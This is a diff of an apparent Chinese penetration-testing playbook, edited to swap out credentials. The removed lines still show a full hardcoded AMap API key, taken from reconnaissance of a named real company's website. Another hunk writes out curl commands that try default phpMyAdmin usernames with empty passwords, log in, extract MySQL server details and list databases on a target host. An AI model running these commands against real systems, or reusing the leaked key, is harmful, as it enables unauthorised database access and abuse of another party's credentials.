@@ -931,7 +931,7 @@ curl -sL "https://franchise.huazhu.com/js/chunk-vendors.xxx.js" | \
 # https://franchise.huazhu.com          ← 主站（已知）
 
 # 另一个常见来源：高德地图 API Key 硬编码
-# https://restapi.amap.com/v3/place/text?key=6ebf98a4368fca69ac36c5769cda5052
+# https://restapi.amap.com/v3/place/text?key=<REPLACE_WITH_API_KEY>
 # → 此 Key 可用于查询调用配额、使用统计
 ```
 
@@ -1302,11 +1302,11 @@ for creds in "pma:" "root:" "admin:" "mysql:" "pmauser:"; do
 done
 
 # 登录后提取 MySQL 信息
-curl -s --max-time 10 -u "pma:" "http://target.com/phpMyAdmin_/main.php?server=1" | \
+curl -s --max-time 10 -u "${TEST_USERNAME}:${TEST_PASSWORD}" "http://target.com/phpMyAdmin_/main.php?server=1" | \
   grep -oP 'Server version:[^<]+|User: [^<]+|MySQL client version:[^<]+'
 
 # 登录后列出数据库（受限用户可能仅 information_schema）
-curl -s --max-time 10 -u "pma:" -b /tmp/pmacookies.txt \
+curl -s --max-time 10 -u "${TEST_USERNAME}:${TEST_PASSWORD}" -b /tmp/pmacookies.txt \
   "http://target.com/phpMyAdmin_/sql.php?server=1&is_js_confirmed=1" \
   -d "sql_query=SHOW+DATABASES" | grep -oP '(?<=<td class="value">)[^<]+'
 ```
